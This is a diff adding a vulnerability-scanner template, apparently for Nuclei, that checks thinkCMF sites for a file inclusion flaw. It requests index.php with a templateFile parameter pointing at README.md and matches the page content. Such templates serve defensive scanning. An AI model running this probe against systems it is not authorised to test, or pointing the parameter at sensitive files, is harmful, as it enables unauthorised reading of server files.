@@ -1,0 +1,22 @@
+id: thinkCMF_include
+
+info:
+  name: thinkCMF文件包含漏洞
+  author: str1am
+  severity: high
+  tags: pma
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?a=display&templateFile=README.md"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "官网:http://www.thinkcmf.com"
+        part: body
+        condition: and
